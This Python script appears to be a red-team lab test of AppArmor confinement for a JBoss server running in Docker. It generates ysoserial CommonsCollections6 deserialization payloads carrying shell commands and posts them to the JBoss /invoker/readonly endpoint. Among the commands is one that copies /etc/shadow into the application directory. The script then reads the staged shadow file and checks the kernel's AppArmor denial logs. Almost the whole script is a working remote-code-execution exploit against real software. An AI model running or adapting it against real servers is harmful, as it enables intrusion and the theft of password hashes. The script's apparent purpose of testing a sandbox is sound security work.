# -*- coding: utf-8 -*-
"""RT5-A2 JBoss: abuse GRANTED enumerated binaries (real paths) via CC6 argv exec.
   1) /bin/cp  /etc/shadow -> app tree   (exec-set abuse + /etc r abuse + app-tree tamper)
   2) /bin/mkdir app-tree dir; /bin/rm it (delete primitive demo)
   3) /bin/cp  -> /tmp probe             (expect kernel DENY)
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
from common import gen_yso, session  # noqa: E402

OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

SHOTS = [
    ("cp-shadow-to-apptree", "/bin/cp /etc/shadow /jboss-6.1.0.Final/rt5_cp_shadow"),
    ("mkdir-apptree", "/bin/mkdir /jboss-6.1.0.Final/rt5_dir"),
    ("cp-to-tmp-probe", "/bin/cp /etc/hostname /tmp/rt5_cp_tmp"),
]

s = session()
for label, cmd in SHOTS:
    ser = gen_yso("CommonsCollections6", cmd, os.path.join(OUT, "rt5_jboss_%s.ser" % label))
    data = open(ser, "rb").read()
    r = s.post("http://127.0.0.1:18080/invoker/readonly", data=data,
               headers={"Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
               timeout=30)
    print("[*] %-22s HTTP %s (%dB)" % (label, r.status_code, len(r.content)))

print("\n=== truth: app tree ===")
for p in ["/jboss-6.1.0.Final/rt5_cp_shadow", "/jboss-6.1.0.Final/rt5_dir"]:
    r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time", p],
                       capture_output=True, text=True)
    print((r.stdout + r.stderr).strip())
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "cat",
                    "/jboss-6.1.0.Final/rt5_cp_shadow"], capture_output=True, text=True)
print("--- staged shadow content head ---")
print("\n".join(r.stdout.splitlines()[:3]) or r.stderr[:200])

print("=== truth: /tmp probe (expect ABSENT) ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                    "/tmp/rt5_cp_tmp"], capture_output=True, text=True)
print((r.stdout + r.stderr).strip())

print("=== audit (new DENIED, aa-jboss, since cp shots) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-jboss' | tail -4"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)
